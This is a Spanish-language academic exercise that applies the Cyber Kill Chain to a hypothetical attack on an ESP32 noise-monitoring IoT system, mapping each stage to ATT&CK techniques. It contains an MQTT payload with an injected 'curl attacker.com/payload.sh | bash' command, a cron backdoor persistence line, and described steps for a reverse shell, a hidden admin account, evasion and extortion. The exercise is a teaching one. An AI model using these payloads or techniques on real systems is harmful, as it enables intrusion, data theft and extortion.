# Ejercicio Cyber Kill Chain – Ataque

## Autor
**Nombre:** Ing. José Pedro Rivero Peña  
**Especialización:** Internet de las Cosas (IoT)  
**Universidad:** Universidad de Buenos Aires (UBA)  
**Año:** 2025  

## Sistema Víctima
Sistema IoT de monitoreo de niveles de ruido en entornos cerrados o pequeñas áreas urbanas. Utiliza sensores conectados a microcontroladores ESP32 con conectividad Wi-Fi y LoRa, enviando los datos a una base de datos en la nube. El acceso a la información se realiza a través de un dashboard web, desde donde se configuran umbrales de alerta y se visualizan datos históricos.

## Objetivo del Ataque
Lograr acceso persistente y silencioso al sistema de monitoreo de ruido para exfiltrar información acústica sensible en entornos críticos, sin ser detectado por los administradores. Estos datos podrían ser utilizados con fines de espionaje industrial o extorsión, aprovechando la sensibilidad de los entornos monitoreados como hospitales, oficinas públicas o empresas privadas.La premisa parte del supuesto de que los datos de ruido pueden ser correlacionados con actividad humana o patrones que revelen dinámicas internas de organizaciones.

## Resolución del Ataque: Cyber Kill Chain

### 1️⃣ Reconnaissance

Realizo un análisis de superficie a través de fuentes abiertas:

- Encuentro el repositorio público del proyecto en GitHub, donde se detallan endpoints como `/api/data` y `/api/export/csv`.
- Encuentro documentación técnica que menciona el uso de ESP32, MQTT, JWT y un backend en Node.js con MongoDB.
- Descubro nombres de usuarios en los commits y archivos `.md`.
- Detecto un entorno de pruebas expuesto públicamente (`iot-staging.example.ar`) sin autenticación, por un despliegue de staging mal configurado.
- Utilizo herramientas como `WhatWeb`, `nmap` y `wig` para analizar encabezados HTTP, puertos abiertos, y versiones de servicios, lo que me permite confirmar la presencia de MongoDB, Express y un broker MQTT expuesto.

- **Técnicas ATT&CK utilizadas:**
- T1593 – Search Open Websites/Domains
  https://attack.mitre.org/techniques/T1593/  
- T1592.002 – Gather Victim Identity Information: Email Addresses
  https://attack.mitre.org/techniques/T1589/002/
- T1596.001 - Search Open Technical Databases: DNS/Passive DNS
  https://attack.mitre.org/techniques/T1596/001/
  
  ---  
    
### 2️⃣ Weaponization 

Con la información recolectada:

- Descargo datos exportados en JSON desde `/api/export/csv` para analizar la estructura de los registros acústicos.
- Desarrollo un script en Python que simula un ESP32 falso y puede enviar datos al sistema.
- Identifico una ruta `/upload/config` usada para actualizaciones y la preparo como vector de entrega.

- **Técnicas ATT&CK utilizadas:**
- T1608.001 – Stage Capabilities: Upload Malware
  https://attack.mitre.org/techniques/T1608/001/  
- CWE-434 – Unrestricted File Upload
  https://cwe.mitre.org/data/definitions/434.html
- T1587.001 - Develop Capabilities: Malware
  https://attack.mitre.org/techniques/T1587/001/
  
  ---

### 3️⃣ Delivery 

Utilizo la ruta `/upload/config` para subir un archivo `.conf` aparentemente legítimo, pero que incluye una carga útil que ejecuta una shell inversa hacia mi servidor.

También preparo un payload MQTT malicioso:

```json
{
  "sensor_id": "node-5",
  "timestamp": "2025-04-01T15:30:00Z",
  "dB_level": 55,
  "extra": ";curl http://attacker.com/payload.sh | bash"
}
```

Este payload es aceptado por el backend debido a validaciones débiles del esquema JSON, que no filtra campos no reconocidos como `extra`.

- **Técnicas ATT&CK utilizadas:**
- T1203 – Exploitation for Client Execution
  https://attack.mitre.org/techniques/T1203/
- T1059.006 – Command and Scripting Interpreter: Python
  https://attack.mitre.org/techniques/T1059/006/
  
  ---

### 4️⃣ Exploitation 
Una vez que el archivo fue ejecutado por el backend, accedo a la consola remota y navego por los registros de sensores.

Inserto un hook en el proceso que maneja las mediciones entrantes para duplicar silenciosamente cada entrada nueva y enviarla a mi servidor.

**Técnicas ATT&CK:**
- T1055.001 – Process Injection
  https://attack.mitre.org/techniques/T1055/001/
- T1565.001 – Data Manipulation: Stored Data Manipulation
  https://attack.mitre.org/techniques/T1565/001/
  
  ---

### 5️⃣ Installation 
Creo una tarea `cron` en el servidor comprometido:

```bash
@reboot /usr/bin/python3 /var/backups/refresh_backdoor.py
```

Esto garantiza que el proceso de exfiltración continúe incluso tras reinicios.

Además, inserto un nuevo usuario en MongoDB con nombre `admin_support2`, que se asemeja a los del sistema. Le asigno un rol de bajo perfil (`logger_readonly`) para evitar levantar sospechas inmediatas en posibles auditorías.

- **Técnicas ATT&CK utilizadas:**
- T1053.003 – Scheduled Task/Job: Cron
  https://attack.mitre.org/techniques/T1053/003/ 
- T1136.001 – Create Account: Local Account
  https://attack.mitre.org/techniques/T1136/001/
  
  ---

### 6️⃣ Command & Control (C2)

Establezco un canal HTTPS que conecta el backend comprometido con mi servidor C2 externo. A través de él, controlo cuándo enviar datos, actualizar el script o detenerlo para evitar detección.

El script evalúa condiciones antes de ejecutar: sólo se activa en horas de baja actividad (03:00–04:00 AM) y suspende su ejecución si detecta cambios recientes en el archivo `.env` del sistema.

- **Técnicas ATT&CK utilizadas:**
- T1071.001 – Application Layer Protocol: Web Protocols (HTTPS)
  https://attack.mitre.org/techniques/T1071/001/
- T1095 – Non-Application Layer Protocol
  https://attack.mitre.org/techniques/T1095/
  
  --- 

### 7️⃣ Actions on Objectives 

Empiezo a recibir datos acústicos en tiempo real desde entornos sensibles como hospitales o edificios gubernamentales.

Los registros son comprimidos y cifrados con AES-256 antes de ser exfiltrados a través del canal HTTPS. Esto impide que sean interceptados incluso si se detecta tráfico anómalo.

Analizo los patrones para inferir horarios de actividad, reuniones, presencia de personal, etc.  
Preparo una campaña de extorsión sugiriendo que los datos podrían publicarse o venderse a terceros si no se realiza un pago.

- **Técnicas ATT&CK utilizadas:**
- T1119 – Automated Collection
  https://attack.mitre.org/techniques/T1119/  
- T1567.002 – Exfiltration Over Web Service
  https://attack.mitre.org/techniques/T1567/ 

## Diagrama de Flujo del Ataque

1. Recolección OSINT + escaneo técnico
         ⬇
2. Desarrollo de payload y análisis de estructura
         ⬇
3. Entrega vía `/upload/config` o MQTT  
         ⬇
4. Ejecución + shell remota
         ⬇
5. Cronjob + usuario oculto
         ⬇
6. C2 con horarios programados
         ⬇
7. Exfiltración cifrada y controlada
   

## 💡 Inspiración del Ataque

Este ataque toma inspiración en campañas reales de sabotaje y espionaje industrial como STUXNET, donde un sistema autónomo y aislado fue manipulado mediante vectores físicos y digitales para afectar procesos industriales críticos. Aunque el sistema víctima en este caso se limita a monitoreo ambiental, sus datos pueden representar patrones de comportamiento humano y rutinas organizacionales, lo que lo convierte en una fuente de inteligencia pasiva valiosa.


## Conclusión
Este ejercicio demuestra cómo, con información mínima expuesta al público, es posible construir un ataque completo, silencioso y persistente contra un sistema IoT. En lugar de interrumpir el servicio o dañar el sistema, el objetivo es recolectar y explotar datos valiosos que el sistema genera continuamente.

Además, al incorporar técnicas de evasión horaria, exfiltración cifrada y persistencia oculta, se muestra cómo un atacante puede permanecer sin ser detectado durante largo tiempo. Esto refuerza la necesidad de aplicar controles de validación de datos, segmentación de servicios, autenticación fuerte, y auditoría constante de logs y cuentas del sistema.

Este ejercicio ayuda a mirar los proyectos con una mirada más crítica y consciente: cada línea de código, cada endpoint, cada sensor, puede convertirse en un punto de entrada si no se lo protege adecuadamente. 
